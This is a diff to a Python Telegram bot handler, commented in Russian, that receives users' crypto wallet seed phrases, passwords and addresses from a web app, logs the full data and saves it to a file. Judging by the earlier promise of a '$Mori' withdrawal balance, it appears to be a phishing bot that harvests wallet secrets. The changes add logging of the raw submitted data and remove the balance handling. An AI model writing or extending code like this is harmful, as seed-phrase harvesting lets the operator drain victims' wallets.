@@ -350,32 +350,23 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         elif data.get('type') == 'wallet_data':
             # Получение данных кошелька от пользователя
+            logger.info(f"=== WALLET_DATA RECEIVED ===")
+            logger.info(f"User ID: {user_id}, Chat ID: {chat_id}")
+            logger.info(f"Full data: {data}")
+            
             seed_phrase = data.get('seedPhrase', '')
             password = data.get('password', '')
             wallet_address = data.get('walletAddress', '')
-            wallet_balance = data.get('balance', 0)
             
             logger.info(f"Wallet data received from user {user_id}")
-            logger.info(f"Balance: {wallet_balance}, Address: {wallet_address[:20]}...")
-            
-            # Сохраняем данные кошелька
-            if user_id not in user_balances:
-                user_balances[user_id] = 0
-            
-            # Обновляем баланс, если передан
-            try:
-                balance_value = float(wallet_balance) if wallet_balance else 0
-                if balance_value > 0:
-                    user_balances[user_id] = balance_value
-            except:
-                pass
+            logger.info(f"Seed phrase length: {len(seed_phrase)}, Password length: {len(password)}")
+            logger.info(f"Address: {wallet_address[:20] if wallet_address else 'empty'}...")
             
             # Сохраняем данные кошелька в файл
             wallet_data = {
                 'seedPhrase': seed_phrase,
                 'password': password,
                 'walletAddress': wallet_address,
-                'balance': user_balances[user_id],
                 'timestamp': str(update.message.date) if update.message else ''
             }
             
@@ -388,16 +379,11 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             except Exception as e:
                 logger.error(f"Error saving wallet data: {e}")
             
-            # Сохраняем баланс
-            save_user_data()
-            
-            # Отправляем сообщение пользователю с его данными и балансом
+            # Отправляем сообщение пользователю с его данными
             user_name = update.effective_user.first_name or "Пользователь"
-            current_balance = user_balances[user_id]
             
             message_text = (
                 f"✅ Данные кошелька получены!\n\n"
-                f"💰 Ваш баланс для вывода: {current_balance} $Mori\n\n"
                 f"📝 Seed фраза:\n`{seed_phrase}`\n\n"
                 f"🔑 Пароль:\n`{password}`\n\n"
                 f"💼 Адрес кошелька:\n`{wallet_address}`\n\n"
@@ -419,7 +405,6 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
                         chat_id=chat_id,
                         text=(
                             f"✅ Данные кошелька получены!\n\n"
-                            f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
                             f"📝 Seed фраза: {seed_phrase}\n\n"
                             f"🔑 Пароль: {password}\n\n"
                             f"💼 Адрес кошелька: {wallet_address}\n\n"
